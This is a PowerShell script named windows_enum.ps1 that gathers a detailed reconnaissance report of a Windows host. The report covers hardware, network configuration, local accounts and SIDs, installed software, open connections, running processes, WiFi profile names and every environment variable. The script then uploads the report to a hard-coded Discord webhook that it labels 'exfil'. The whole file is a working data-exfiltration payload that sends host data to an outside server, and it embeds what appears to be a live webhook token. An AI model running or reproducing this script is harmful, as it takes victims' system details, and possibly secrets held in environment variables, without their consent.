# windows_enum.ps1 - PowerShell equivalent of the batch recon script

# Create result.txt in temp directory
$OUTPUT = "$env:TEMP\result.txt"
"System Reconnaissance Report" | Out-File -FilePath $OUTPUT -Encoding utf8
"Timestamp: $(Get-Date)" | Add-Content -Path $OUTPUT -Encoding utf8
"" | Add-Content -Path $OUTPUT -Encoding utf8

# SYSTEM INFORMATION
"======================================" | Add-Content $OUTPUT
"SYSTEM INFORMATION" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
systeminfo | Select-String "OS Name|OS Version|System Manufacturer|System Model|System Type|Total Physical Memory" | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# CPU INFORMATION
"======================================" | Add-Content $OUTPUT
"CPU INFORMATION" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
Get-WmiObject Win32_Processor | Select Caption,Name,Description,MaxClockSpeed,NumberOfCores,NumberOfLogicalProcessors | Format-List | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# MEMORY INFORMATION
"======================================" | Add-Content $OUTPUT
"MEMORY INFORMATION" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
Get-WmiObject Win32_PhysicalMemory | Select BankLabel,Capacity,Speed,MemoryType,DeviceLocator | Format-List | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# DISK INFORMATION
"======================================" | Add-Content $OUTPUT
"DISK INFORMATION" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
Get-WmiObject Win32_LogicalDisk | Select DeviceID,Size,FreeSpace,Description | Format-List | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# NETWORK ADAPTERS
"======================================" | Add-Content $OUTPUT
"NETWORK ADAPTERS" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
Get-WmiObject Win32_NetworkAdapter | Select Name,NetConnectionID,Speed,PhysicalAdapter | Format-List | Add-Content $OUTPUT
ipconfig /all | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# USER ACCOUNTS
"======================================" | Add-Content $OUTPUT
"USER ACCOUNTS" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
Get-WmiObject Win32_UserAccount -Filter "LocalAccount=true" | Select Name,SID,Disabled | Format-List | Add-Content $OUTPUT
"Current User: $env:USERNAME" | Add-Content $OUTPUT
"Domain: $env:USERDOMAIN" | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# INSTALLED SOFTWARE
"======================================" | Add-Content $OUTPUT
"INSTALLED SOFTWARE" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
Get-WmiObject Win32_Product | Select Name,Version,Vendor | Format-List | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# NETWORK CONNECTIONS
"======================================" | Add-Content $OUTPUT
"NETWORK CONNECTIONS" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
netstat -ano | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# RUNNING PROCESSES
"======================================" | Add-Content $OUTPUT
"RUNNING PROCESSES" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
tasklist /v | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# WIFI PROFILES
"======================================" | Add-Content $OUTPUT
"WIFI PROFILES" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
netsh wlan show profiles | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# USB DEVICES
"======================================" | Add-Content $OUTPUT
"USB DEVICES" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
Get-WmiObject Win32_USBHub | Select DeviceID,Description | Format-List | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# PRINTERS
"======================================" | Add-Content $OUTPUT
"PRINTERS" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
Get-WmiObject Win32_Printer | Select Name,PortName,DriverName | Format-List | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# ENVIRONMENT VARIABLES
"======================================" | Add-Content $OUTPUT
"ENVIRONMENT VARIABLES" | Add-Content $OUTPUT
"======================================" | Add-Content $OUTPUT
Get-ChildItem Env: | Format-Table Name,Value -AutoSize | Out-String | Add-Content $OUTPUT
"" | Add-Content $OUTPUT

# Discord webhook exfil
$WEBHOOK_URL = "https://discord.com/api/webhooks/1478994129508892672/lA7G6TFM417kohIT57ztdQP1N6imbX9HwhTIbYQiKzvX3nJSSVl4UcJF0fVIEe8HN_ZE"
# Send the report as a file to Discord
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

# Build multipart/form-data body
$bodyLines = @()
$bodyLines += "--$boundary$LF"
$bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"result.txt`"$LF"
$bodyLines += "Content-Type: text/plain$LF$LF"
$bodyLines += Get-Content $OUTPUT -Raw
$bodyLines += "$LF--$boundary--$LF"

$body = $bodyLines -join ""

Invoke-WebRequest -Uri $WEBHOOK_URL -Method POST -Body $body -ContentType "multipart/form-data; boundary=$boundary" -UseBasicParsing
# Clean up (uncomment to delete local file)
# Remove-Item $OUTPUT -Force
